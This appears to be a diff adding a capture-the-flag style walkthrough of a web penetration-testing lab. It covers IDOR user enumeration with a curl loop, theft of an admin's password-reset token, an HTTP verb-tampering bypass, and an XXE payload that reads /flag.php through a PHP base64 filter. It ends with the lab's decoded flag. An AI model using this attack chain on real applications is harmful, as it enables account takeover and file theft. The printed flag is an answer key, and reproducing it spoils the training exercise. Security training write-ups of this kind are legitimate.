@@ -1,1 +1,56 @@
+Scenario
+You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.
+
+The login details are provided in the question below.
+
+
+CHALLENGE: Authenticate to 83.136.249.46:44591 with user "htb-student" and password "Academy_student!"
+
+Question 1 - Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.
+1) authenticate to the website above with creds provided
+2) have dev tools -> network pulled up and in the -> network tab we can see -> http://83.136.249.46:44591/api.php/user/74 as well as "uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}
+3) hit edit and resend to see if its vulnerable to IDOR -> we changed the uid to http://83.136.249.46:44591/api.php/user/75 and got -> {"uid":"75","username":"h.ray","full_name":"Harrison Ray","company":"Satterfield, Schultz and Kemmer"}
+-> this indicates that it is vulnerable 
+4) lets create a loop script to go through the uids of website 
+#!/bin/bash
+
+for uid in {1..100}; do
+	curl -s "http://83.136.249.46:44591/api.php/user/$uid"; echo
+done
+
+5) bash uid.sh | grep -i "admin" | jq .
+{
+  "uid": "52",
+  "username": "a.corrales",
+  "full_name": "Amor Corrales",
+  "company": "Administrator"
+}
+
+6) now in the webpage we see a settings page for our current user -> click this -> takes us to a change password page, type in test or whatever youd like the password to be 
+7) with the network devs tool still open we see a GET request to the endpoint /api/token/74, and within the response of the request, the token of the user is returned, which is e51a8a14-17ac-11ec-8e67-a3c050fe0c26 for the user with the uid of 74:
+8) Instead of attaining the token for uid 74, lets modify it to 52 with edit and resend, as in /api.php/token/52:
+9) the response of the sent modified request, we will get e51a85fa-17ac-11ec-8e51-e78234eb7b0c as the token for the user with uid 52:
+/52 password reset token= e51a85fa-17ac-11ec-8e51-e78234eb7b0c
+10) Checking the POST request to reset.php, we will notice that it requires three parameters, uid, token, and password:
+11) Instead of reseting the password of the user with uid 74, we need to reset the one for uid 52, given that all three parameters are known (uid:52, token:e51a85fa-17ac-11ec-8e51-e78234eb7b0c, and password:test)  
+12) by just doing edit and resend we see Access Denied 
+13) lets bypass this by changing the POST request to a GET request and sending the URL parameters as follows: 
+URL = http://83.136.249.46:44591/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test
+14) response = Password Changed Successfully 
+15) log out and log in now as a.corrales:test 
+16) we will notice that there is a new feature of "adding events", we need to click on "ADD EVENT"
+17) With the Network tab of the Web Developer Tools open, we need to feed the fields any dummy data and inspect the POST request sent to addEvent.php, discovering that the request payload is XML data:
+18) now we need to instead send a malicious XXE payload with edit and resend inside of netowrk dev tools that will read the flag file "/flag.php" via the the PHP filter convert.base64-encode:
+XXE PAYLOAD: 
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
+<root>
+    <name>&xxe;</name>
+    <details>test</details>
+    <date>2025-13-03</date>
+</root>
+
+19) Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
+
+20) echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
+<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
 
